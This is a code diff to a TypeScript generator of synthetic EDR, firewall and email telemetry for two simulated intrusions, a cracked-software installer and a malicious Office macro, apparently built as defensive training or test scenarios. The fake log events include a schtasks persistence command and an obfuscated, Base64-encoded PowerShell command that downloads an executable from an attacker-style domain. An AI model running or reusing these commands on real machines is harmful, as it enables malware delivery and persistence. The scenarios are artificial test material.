-      network: { bytes_out: 2048, bytes_in: 18874368, domain: downloadDomain },
-      description: "WS-ENG-2093 downloaded Office_Pro_2026_Activator_Setup.exe from fast-office-tools-download.top at 20:10, following a sponsored search result click.",
+      network: { url: `https://${downloadDomain}/dl/Office_Pro_2026_Activator_Setup.exe`, domain: downloadDomain, method: "GET", bytes_out: 2048, bytes_in: 18874368 },
+      file: { name: "Office_Pro_2026_Activator_Setup.exe", path: "Office_Pro_2026_Activator_Setup.exe", sha256: installerHash, size: 18874368 },
+      description: "WS-ENG-2093 downloaded Office_Pro_2026_Activator_Setup.exe (Windows executable) over HTTPS from fast-office-tools-download.top at 20:10.",
       raw: {
         "event.action": "network-connection-allowed", "event.outcome": "success",
         "source.ip": victim.ip, "source.port": "58122",
-        "destination.ip": "141.98.80.212", "destination.port": "443",
+        "destination.ip": downloadIp, "destination.port": "443",
         "network.protocol": "tcp", "network.transport": "tcp",
         "network.application": "ssl",
-        "pan.app": "ssl", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTPS",
-        "network.bytes_out": "2048", "network.bytes_in": "18874368",
-        "dns.query_domain": downloadDomain,
+        "pan.app": "ssl", "pan.action": "alert", "pan.rule": "Outbound-Web-Users",
+        "url.full": `https://${downloadDomain}/dl/Office_Pro_2026_Activator_Setup.exe`,
+        "pan.filename": "Office_Pro_2026_Activator_Setup.exe",
+        "url.category": "questionable",
         "action_result": "allow",
+      },
+    },
+    {
+      id: "evt_crack_01b_save", ts: T(30_000),
+      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
+      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
+      severity: "low", mitre_technique: "T1204.002",
+      file: { path: installerPath, sha256: installerHash, size: 18874368 },
+      process: {
+        name: "chrome.exe", pid: 4120, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        user: "NEXACORP\\y.golan", integrity: "medium",
+      },
+      description: "chrome.exe on WS-ENG-2093 saved Office_Pro_2026_Activator_Setup.exe to y.golan's Downloads folder.",
+      raw: {
+        "ActionType": "FileCreated",
+        "FileName": "Office_Pro_2026_Activator_Setup.exe",
+        "FolderPath": installerPath,
+        "SHA256": installerHash,
+        "FileOriginUrl": `https://${downloadDomain}/dl/Office_Pro_2026_Activator_Setup.exe`,
+        "FileOriginReferrerUrl": `https://${downloadDomain}/office-activator`,
+        "InitiatingProcessFileName": "chrome.exe",
+        "InitiatingProcessAccountName": "y.golan",
+        "InitiatingProcessAccountDomain": "nexacorp",
+        "DeviceName": victim.hostname,
+        "ReportId": "889210",
       },
     },
     {
@@ -6964,7 +7123,8 @@ export function crackedSoftwareScenarioEvents() {
       description: "y.golan ran Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 with explorer.exe as the parent process; the binary is unsigned.",
       process: {
         name: "Office_Pro_2026_Activator_Setup.exe", pid: 6120, parent_name: "explorer.exe", parent_pid: 3140,
-        cmdline: "\"C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe\"",
+        path: installerPath,
+        cmdline: `"${installerPath}"`,
         user: "NEXACORP\\y.golan", integrity: "medium",
         hash: { sha256: installerHash },
       },
@@ -6972,10 +7132,10 @@ export function crackedSoftwareScenarioEvents() {
         "Timestamp": T(6 * MIN),
         "ActionType": "ProcessCreated",
         "FileName": "Office_Pro_2026_Activator_Setup.exe",
-        "FolderPath": "C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe",
+        "FolderPath": installerPath,
         "SHA256": installerHash,
         "ProcessId": "6120",
-        "ProcessCommandLine": "\"C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe\"",
+        "ProcessCommandLine": `"${installerPath}"`,
         "ProcessIntegrityLevel": "Medium",
         "SignatureStatus": "Unsigned",
         "InitiatingProcessFileName": "explorer.exe",
@@ -6988,17 +7148,42 @@ export function crackedSoftwareScenarioEvents() {
       },
     },
     {
+      id: "evt_crack_02b_drop", ts: T(6 * MIN + 15_000),
+      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
+      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
+      severity: "medium", mitre_technique: "T1204.002",
+      file: { path: svchelperPath, sha256: payloadHash, size: 512000 },
+      process: {
+        name: "Office_Pro_2026_Activator_Setup.exe", pid: 6120, parent_name: "explorer.exe", parent_pid: 3140,
+        path: installerPath, user: "NEXACORP\\y.golan", integrity: "medium", hash: { sha256: installerHash },
+      },
+      description: "Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 wrote svchelper.exe to C:\\ProgramData\\OfficeTools\\.",
+      raw: {
+        "ActionType": "FileCreated",
+        "FileName": "svchelper.exe",
+        "FolderPath": svchelperPath,
+        "SHA256": payloadHash,
+        "InitiatingProcessFileName": "Office_Pro_2026_Activator_Setup.exe",
+        "InitiatingProcessFolderPath": installerPath,
+        "InitiatingProcessSHA256": installerHash,
+        "InitiatingProcessAccountName": "y.golan",
+        "InitiatingProcessAccountDomain": "nexacorp",
+        "DeviceName": victim.hostname,
+        "ReportId": "889214",
+      },
+    },
+    {
       id: "evt_crack_03_persist", ts: T(6 * MIN + 40_000),
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1053.005",
-      // The installer registers persistence by running schtasks.exe — a process creation
-      // every EDR records, with the task name, trigger and action right in the command line.
-      description: "Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 ran schtasks.exe to register a task named OfficeLicenseRefresh that launches C:\\ProgramData\\OfficeTools\\svchelper.exe every 30 minutes.",
+      // The installer runs as a Medium-integrity user, so it registers the task to run as
+      // that user (no /ru SYSTEM — that would need admin and fail "Access is denied").
+      description: "Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 ran schtasks.exe to register a task named OfficeLicenseRefresh that launches C:\\ProgramData\\OfficeTools\\svchelper.exe every 30 minutes and at logon.",
       process: {
         name: "schtasks.exe", pid: 6456, parent_name: "Office_Pro_2026_Activator_Setup.exe", parent_pid: 6120,
         path: "C:\\Windows\\System32\\schtasks.exe",
-        cmdline: "schtasks.exe /create /tn \"OfficeLicenseRefresh\" /tr \"C:\\ProgramData\\OfficeTools\\svchelper.exe\" /sc minute /mo 30 /ru SYSTEM /f",
+        cmdline: `schtasks.exe /create /tn "OfficeLicenseRefresh" /tr "${svchelperPath}" /sc minute /mo 30 /f`,
         user: "NEXACORP\\y.golan", integrity: "medium",
       },
       raw: {
@@ -7007,16 +7192,17 @@ export function crackedSoftwareScenarioEvents() {
         "FileName": "schtasks.exe",
         "FolderPath": "C:\\Windows\\System32\\schtasks.exe",
         "ProcessId": "6456",
-        "ProcessCommandLine": "schtasks.exe /create /tn \"OfficeLicenseRefresh\" /tr \"C:\\ProgramData\\OfficeTools\\svchelper.exe\" /sc minute /mo 30 /ru SYSTEM /f",
+        "ProcessCommandLine": `schtasks.exe /create /tn "OfficeLicenseRefresh" /tr "${svchelperPath}" /sc minute /mo 30 /f`,
         "ProcessIntegrityLevel": "Medium",
         "InitiatingProcessFileName": "Office_Pro_2026_Activator_Setup.exe",
         "InitiatingProcessId": "6120",
-        "InitiatingProcessFolderPath": "C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe",
+        "InitiatingProcessFolderPath": installerPath,
+        "InitiatingProcessSHA256": installerHash,
         "InitiatingProcessAccountName": "y.golan",
         "InitiatingProcessAccountDomain": "nexacorp",
         "DeviceName": victim.hostname,
         "AttackTechniques": ["T1053.005"],
-        "ReportId": "889214",
+        "ReportId": "889215",
       },
     },
     {
@@ -7024,24 +7210,24 @@ export function crackedSoftwareScenarioEvents() {
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1053.005",
-      // When the registered task fires, Task Scheduler (svchost -k netsvcs ... Schedule) is the parent.
-      description: "The OfficeLicenseRefresh task fired on WS-ENG-2093: svchelper.exe was launched by the Windows Task Scheduler service host.",
+      // The task runs as the registering user (y.golan, Medium) — Task Scheduler is the parent.
+      description: "The OfficeLicenseRefresh task fired on WS-ENG-2093: svchelper.exe was launched by the Windows Task Scheduler service host under y.golan.",
       process: {
         name: "svchelper.exe", pid: 7020, parent_name: "svchost.exe", parent_pid: 1136,
-        path: "C:\\ProgramData\\OfficeTools\\svchelper.exe",
-        cmdline: "\"C:\\ProgramData\\OfficeTools\\svchelper.exe\"",
-        user: "NT AUTHORITY\\SYSTEM", integrity: "system",
+        path: svchelperPath,
+        cmdline: `"${svchelperPath}"`,
+        user: "NEXACORP\\y.golan", integrity: "medium",
         hash: { sha256: payloadHash },
       },
       raw: {
         "Timestamp": T(7 * MIN + 30_000),
         "ActionType": "ProcessCreated",
         "FileName": "svchelper.exe",
-        "FolderPath": "C:\\ProgramData\\OfficeTools\\svchelper.exe",
+        "FolderPath": svchelperPath,
         "SHA256": payloadHash,
         "ProcessId": "7020",
-        "ProcessCommandLine": "\"C:\\ProgramData\\OfficeTools\\svchelper.exe\"",
-        "ProcessIntegrityLevel": "System",
+        "ProcessCommandLine": `"${svchelperPath}"`,
+        "ProcessIntegrityLevel": "Medium",
         "SignatureStatus": "Unsigned",
         "InitiatingProcessFileName": "svchost.exe",
         "InitiatingProcessId": "1136",
@@ -7049,9 +7235,38 @@ export function crackedSoftwareScenarioEvents() {
         "InitiatingProcessCommandLine": "svchost.exe -k netsvcs -p -s Schedule",
         "InitiatingProcessAccountName": "system",
         "InitiatingProcessAccountDomain": "nt authority",
+        "AccountName": "y.golan",
+        "AccountDomain": "nexacorp",
         "DeviceName": victim.hostname,
         "AttackTechniques": ["T1053.005"],
-        "ReportId": "889215",
+        "ReportId": "889216",
+      },
+    },
+    {
+      // Impact: the payload calls out to its C2 — gives the analyst a network indicator and a reason
+      // to treat the host's stored credentials as exposed.
+      id: "evt_crack_04b_c2", ts: T(7 * MIN + 45_000),
+      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "net_connection",
+      hostname: victim.hostname, user_email: victim.email,
+      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 52660, protocol: "tcp",
+      severity: "high", mitre_technique: "T1071.001",
+      network: { domain: c2Domain },
+      process: {
+        name: "svchelper.exe", pid: 7020, parent_name: "svchost.exe", parent_pid: 1136,
+        path: svchelperPath, user: "NEXACORP\\y.golan", integrity: "medium", hash: { sha256: payloadHash },
+      },
+      description: `svchelper.exe on WS-ENG-2093 connected to ${c2Domain} (${c2Ip}) on port 443.`,
+      raw: {
+        "ActionType": "ConnectionSuccess",
+        "RemoteIP": c2Ip, "RemotePort": "443", "RemoteUrl": c2Domain,
+        "LocalIP": victim.ip, "LocalPort": "52660",
+        "InitiatingProcessFileName": "svchelper.exe",
+        "InitiatingProcessFolderPath": svchelperPath,
+        "InitiatingProcessSHA256": payloadHash,
+        "InitiatingProcessAccountName": "y.golan",
+        "InitiatingProcessAccountDomain": "nexacorp",
+        "DeviceName": victim.hostname,
+        "ReportId": "889217",
       },
     },
     {
@@ -7059,14 +7274,14 @@ export function crackedSoftwareScenarioEvents() {
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "av_quarantine",
       hostname: victim.hostname, user_email: victim.email,
       severity: "critical", mitre_technique: "T1053.005",
-      file: { path: "C:\\ProgramData\\OfficeTools\\svchelper.exe", sha256: payloadHash, size: 512000 },
-      description: "Microsoft Defender quarantined svchelper.exe on WS-ENG-2093 as a known trojan and killed the running payload. The OfficeLicenseRefresh scheduled task itself is not shown as removed, so the analyst must confirm it is deleted.",
+      file: { path: svchelperPath, sha256: payloadHash, size: 512000 },
+      description: "Microsoft Defender quarantined svchelper.exe on WS-ENG-2093 and killed the running payload; the OfficeLicenseRefresh scheduled task is not recorded as removed.",
       raw: {
         "Timestamp": T(9 * MIN),
         "ActionType": "AntivirusDetection",
         "ThreatName": "Trojan:Win32/Wacatac.B!ml",
         "FileName": "svchelper.exe",
-        "FolderPath": "C:\\ProgramData\\OfficeTools\\svchelper.exe",
+        "FolderPath": svchelperPath,
         "SHA256": payloadHash,
         "DeviceName": victim.hostname,
         "action_result": "quarantined",
@@ -7074,7 +7289,7 @@ export function crackedSoftwareScenarioEvents() {
     },
   ];
 
-  return { title: "Cracked Software Installer → Scheduled Task Persistence", events, T, MIN, downloadDomain, installerHash, payloadHash };
+  return { title: "Cracked Software Installer → Scheduled Task Persistence", events, T, MIN, downloadDomain, downloadIp, c2Domain, c2Ip, installerHash, payloadHash };
 }
 
 /** Telemetry half of `buildMaliciousMacroScenario`: the events and the story title, no answer key. */
@@ -7085,28 +7300,59 @@ export function maliciousMacroScenarioEvents() {
 
   const victim = { hostname: "WS-SALES-1876", email: "s.peretz@nexacorp.com", ip: "10.10.33.91" };
   const c2Domain = "invoice-sync-cdn.xyz";
-  const c2Ip = "185.220.101.142";
+  // Story-specific infrastructure (no other storyline uses these addresses).
+  const c2Ip = "23.137.249.140";
+  const senderIp = "5.181.80.66";
+  const msgId = "<a41c07e2.9d3f.4b8e@client-invoices-portal.info>";
+  const docmHash = makeSha256("q3_client_invoice_review_docm_donoff");
+  const invHash = makeSha256("macro_stage2_inv_exe_payload");
+  const docmPath = "C:\\Users\\s.peretz\\Downloads\\Q3_Client_Invoice_Review.docm";
 
   const events: TelemetryEvent[] = [
     {
+      // Delivered clean: Safe Attachments had no verdict at delivery time; the
+      // Malware ZAP row below convicts the same message later (MDO never
+      // delivers a Malware verdict).
       id: "evt_macro_01_email", ts: T(0),
       source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
-      user_email: victim.email, src_ip: "45.148.10.203",
+      user_email: victim.email, src_ip: senderIp,
       severity: "medium", mitre_technique: "T1566.001",
-      description: "s.peretz received an email with a macro-enabled Word attachment (Q3_Client_Invoice_Review.docm) from an external sender. SPF and DKIM both failed.",
+      description: "s.peretz received an email with a macro-enabled Word attachment (Q3_Client_Invoice_Review.docm) from an external sender; SPF, DKIM and DMARC all failed and the message was delivered to the inbox.",
       raw: {
         "event.action": "EmailDelivered", "event.outcome": "success",
+        "InternetMessageId": msgId,
         "email.from.address": "billing@client-invoices-portal.info",
         "email.to.address": victim.email,
         "email.subject": "Q3 Invoice Review — Please Confirm by Friday",
-        "email.attachment.name": "Q3_Client_Invoice_Review.docm",
+        "email.attachments.file.name": "Q3_Client_Invoice_Review.docm",
+        "email.attachments.file.hash.sha256": docmHash,
+        "email.attachments.file.size": 48210,
         "email.direction": "inbound",
-        "file.size": "48210",
-        "source.ip": "45.148.10.203",
+        "source.ip": senderIp,
         "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
         "action_result": "delivered",
-        "block.reason": "No matching transport rule — macro-enabled document type not blocklisted",
-        "threat.category": "Phishing",
+      },
+    },
+    {
+      // The attachment row of the same message — the docm's SHA256 lives here,
+      // not in EmailEvents; it is the pivot to the file on the endpoint.
+      id: "evt_macro_01b_attachment", ts: T(0),
+      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
+      user_email: victim.email,
+      severity: "informational", mitre_technique: "T1566.001",
+      description: "The message's attachment record lists Q3_Client_Invoice_Review.docm (48,210 bytes) with its SHA256.",
+      raw: {
+        "category": "AdvancedHunting-EmailAttachmentInfo",
+        "InternetMessageId": msgId,
+        "email.from.address": "billing@client-invoices-portal.info",
+        "email.to.address": victim.email,
+        "email.subject": "Q3 Invoice Review — Please Confirm by Friday",
+        "email.attachments.file.name": "Q3_Client_Invoice_Review.docm",
+        "email.attachments.file.hash.sha256": docmHash,
+        "email.attachments.file.size": 48210,
+        "email.direction": "inbound",
+        "source.ip": senderIp,
+        "action_result": "delivered",
       },
     },
     {
@@ -7122,17 +7368,6 @@ export function maliciousMacroScenarioEvents() {
       },
       raw: {
         "crowdstrike.event_simpleName": "ProcessRollup2",
-        "crowdstrike.detection.id": "ldt:97f45e3afc637a1614ec711f50bb1286:5234567890",
-        "crowdstrike.detection.description": "powershell.exe launched as a direct child of WINWORD.EXE with a hidden window style and an encoded command argument, consistent with a malicious macro.",
-        "crowdstrike.detection.scenario": "office_spawned_scripting_interpreter",
-        "crowdstrike.detection.tactic": "Execution",
-        "crowdstrike.detection.tactic_id": "TA0002",
-        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
-        "crowdstrike.detection.technique_id": "T1059.001",
-        "crowdstrike.detection.pattern_disposition": "10",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
-        "crowdstrike.detection.severity": "High",
-        "crowdstrike.behaviors": "Parent process is Microsoft Word|Hidden window style|Base64-encoded command argument|Document macros were enabled minutes earlier",
         "process.pid": "7340",
         "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "process.command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AaQBuAHYAbwBpAGMAZQAtAHMAeQBuAGMALQBjAGQAbgAuAHgAeQB6AC8AaQBuAHYALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAaQBuAHYALgBlAHgAZQA=",
@@ -7143,52 +7378,139 @@ export function maliciousMacroScenarioEvents() {
       },
     },
     {
-      id: "evt_macro_03_beacon", ts: T(8 * MIN + 25_000),
-      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
-      hostname: victim.hostname, user_email: victim.email,
-      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
-      severity: "high", mitre_technique: "T1071.001",
-      network: { bytes_out: 2560, bytes_in: 32768, domain: c2Domain },
-      description: "WS-SALES-1876 opened a TLS connection to invoice-sync-cdn.xyz, a domain registered 3 days ago; the firewall allowed the session.",
-      raw: {
-        "event.action": "network-connection-allowed", "event.outcome": "success",
-        "source.ip": victim.ip, "source.port": "55931",
-        "destination.ip": c2Ip, "destination.port": "443",
-        "network.protocol": "tcp", "network.transport": "tcp",
-        "network.application": "ssl",
-        "pan.app": "ssl", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTPS",
-        "network.bytes_out": "2560", "network.bytes_in": "32768",
-        "dns.query_domain": c2Domain,
-        "domain.registration_age_days": "3",
-        "action_result": "allow",
+      // The first page: the EDR's behavioural alert on the Word → PowerShell
+      // chain, seconds after the process started (detect-only on this host group).
+      id: "evt_macro_02b_alert", ts: T(8 * MIN + 6_000),
+      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "edr_alert",
+      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
+      severity: "high", mitre_technique: "T1059.001", mitre_tactic: "Execution",
+      is_detection: true,
+      description: "The EDR raised a high-severity alert on WS-SALES-1876: WINWORD.EXE started powershell.exe with a hidden window and an encoded command; the policy action was detect-only.",
+      process: {
+        name: "powershell.exe", pid: 7340, parent_name: "WINWORD.EXE", parent_pid: 4512,
+        cmdline: "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AaQBuAHYAbwBpAGMAZQAtAHMAeQBuAGMALQBjAGQAbgAuAHgAeQB6AC8AaQBuAHYALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAaQBuAHYALgBlAHgAZQA=",
+        user: "NEXACORP\\s.peretz", integrity: "medium",
       },
-    },
-    {
-      id: "evt_macro_04_detect", ts: T(11 * MIN),
-      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
-      hostname: victim.hostname, user_email: victim.email,
-      severity: "critical", mitre_technique: "T1059.001",
-      file: { path: "C:\\Users\\s.peretz\\Downloads\\Q3_Client_Invoice_Review.docm", size: 48210 },
-      description: "CrowdStrike Falcon killed the encoded PowerShell process on WS-SALES-1876, matching a known commodity loader (family: Emotet-variant).",
       raw: {
         "crowdstrike.event_simpleName": "DetectionSummaryEvent",
-        "crowdstrike.detection.id": "ldt:97f45e3afc637a1614ec711f50bb1286:5234567891",
-        "crowdstrike.detection.description": "Known macro-loader signature match — encoded PowerShell process killed and macro document quarantined.",
-        "crowdstrike.detection.scenario": "known_malware_family",
+        "mde.AlertTitle": "Suspicious PowerShell command line",
         "crowdstrike.detection.tactic": "Execution",
         "crowdstrike.detection.tactic_id": "TA0002",
         "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
         "crowdstrike.detection.technique_id": "T1059.001",
-        "crowdstrike.detection.pattern_disposition": "128",
-        "crowdstrike.detection.pattern_disposition_description": "Prevention, Kill Process, Quarantine File",
+        "crowdstrike.detection.pattern_disposition": "0",
+        "crowdstrike.detection.pattern_disposition_description": "Detection, standard detection.",
+        "crowdstrike.detection.severity": "High",
+        "host.name": victim.hostname,
+        "action_result": "detected",
+      },
+    },
+    {
+      // The decoded command is an HTTP (port 80) download of inv.exe, so the
+      // firewall sees web-browsing on 80 and logs the file transfer by name.
+      id: "evt_macro_03_download", ts: T(8 * MIN + 25_000),
+      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "http_request",
+      hostname: victim.hostname, user_email: victim.email,
+      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 80, protocol: "tcp",
+      severity: "high", mitre_technique: "T1105",
+      network: { url: `http://${c2Domain}/inv.exe`, domain: c2Domain, method: "GET", bytes_out: 412, bytes_in: 286_720 },
+      file: { name: "inv.exe", path: "inv.exe", sha256: invHash, size: 284_160 },
+      description: "WS-SALES-1876 downloaded inv.exe (Windows executable) over HTTP from invoice-sync-cdn.xyz, a newly registered domain; the firewall allowed the transfer.",
+      raw: {
+        "event.action": "network-connection-allowed", "event.outcome": "success",
+        "source.ip": victim.ip, "source.port": "55931",
+        "destination.ip": c2Ip, "destination.port": "80",
+        "network.protocol": "tcp", "network.transport": "tcp",
+        "network.application": "web-browsing",
+        "pan.app": "web-browsing", "pan.action": "allow",
+        "url.full": `http://${c2Domain}/inv.exe`,
+        "url.category": "newly-registered-domain",
+        "pan.filename": "inv.exe",
+        "action_result": "allow",
+      },
+    },
+    {
+      id: "evt_macro_03b_drop", ts: T(8 * MIN + 27_000),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
+      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
+      severity: "high", mitre_technique: "T1105",
+      file: { path: "C:\\Users\\s.peretz\\AppData\\Local\\Temp\\inv.exe", sha256: invHash, size: 284_160 },
+      process: {
+        name: "powershell.exe", pid: 7340, parent_name: "WINWORD.EXE", parent_pid: 4512,
+        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        user: "NEXACORP\\s.peretz", integrity: "medium",
+      },
+      description: "powershell.exe on WS-SALES-1876 wrote inv.exe to s.peretz's %TEMP% folder.",
+      raw: {
+        "crowdstrike.event_simpleName": "NewExecutableWritten",
+        "file.path": "C:\\Users\\s.peretz\\AppData\\Local\\Temp\\inv.exe",
+        "file.hash.sha256": invHash,
+        "host.name": victim.hostname,
+        "user.name": "NEXACORP\\s.peretz",
+      },
+    },
+    {
+      id: "evt_macro_04_payload_blocked", ts: T(8 * MIN + 29_000),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
+      hostname: victim.hostname, user_email: victim.email,
+      severity: "critical", mitre_technique: "T1105",
+      file: { path: "C:\\Users\\s.peretz\\AppData\\Local\\Temp\\inv.exe", sha256: invHash, size: 284_160 },
+      description: "The EDR quarantined inv.exe in %TEMP% on WS-SALES-1876 two seconds after it was written, before any process was started from it.",
+      raw: {
+        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
+        "threat.name": "Trojan:Win32/Wacatac.B!ml",
+        "crowdstrike.detection.tactic": "Command and Control",
+        "crowdstrike.detection.technique": "Ingress Tool Transfer",
+        "crowdstrike.detection.technique_id": "T1105",
+        "crowdstrike.detection.pattern_disposition_description": "Prevention, Quarantine File",
         "crowdstrike.detection.severity": "Critical",
-        "crowdstrike.threat.name": "Trojan.Emotet-variant",
-        "crowdstrike.behaviors": "Known macro-loader signature match|Process terminated|Document quarantined",
+        "file.hash.sha256": invHash,
         "host.name": victim.hostname,
         "action_result": "quarantined",
       },
     },
+    {
+      id: "evt_macro_05_docm_quarantine", ts: T(11 * MIN),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
+      hostname: victim.hostname, user_email: victim.email,
+      severity: "high", mitre_technique: "T1204.002",
+      file: { path: docmPath, sha256: docmHash, size: 48210 },
+      description: "The EDR quarantined Q3_Client_Invoice_Review.docm in s.peretz's Downloads folder on WS-SALES-1876 (same SHA256 as the email attachment).",
+      raw: {
+        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
+        "threat.name": "TrojanDownloader:O97M/Donoff!MTB",
+        "crowdstrike.detection.tactic": "Execution",
+        "crowdstrike.detection.technique": "User Execution: Malicious File",
+        "crowdstrike.detection.technique_id": "T1204.002",
+        "crowdstrike.detection.pattern_disposition_description": "Prevention, Quarantine File",
+        "crowdstrike.detection.severity": "High",
+        "file.hash.sha256": docmHash,
+        "host.name": victim.hostname,
+        "action_result": "quarantined",
+      },
+    },
+    {
+      id: "evt_macro_06_zap", ts: T(12 * MIN),
+      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_quarantined",
+      user_email: victim.email,
+      severity: "medium", mitre_technique: "T1566.001",
+      description: "Zero-hour auto purge (ZAP) moved the \"Q3 Invoice Review\" message from s.peretz's inbox to quarantine with a Malware verdict.",
+      raw: {
+        "InternetMessageId": msgId,
+        "email.from.address": "billing@client-invoices-portal.info",
+        "email.to.address": victim.email,
+        "email.subject": "Q3 Invoice Review — Please Confirm by Friday",
+        "email.attachments.file.name": "Q3_Client_Invoice_Review.docm",
+        "email.attachments.file.hash.sha256": docmHash,
+        "email.direction": "inbound",
+        "Action": "Moved to quarantine",
+        "ActionTrigger": "ZAP",
+        "ActionResult": "Success",
+        "ThreatTypes": "Malware",
+        "DeliveryLocation": "Quarantine",
+      },
+    },
   ];
 
-  return { title: "Malicious Office Macro → PowerShell Execution", events, T, MIN, c2Domain, c2Ip };
+  return { title: "Malicious Office Macro → PowerShell Download Blocked", events, T, MIN, c2Domain, c2Ip, docmHash, invHash };
 }
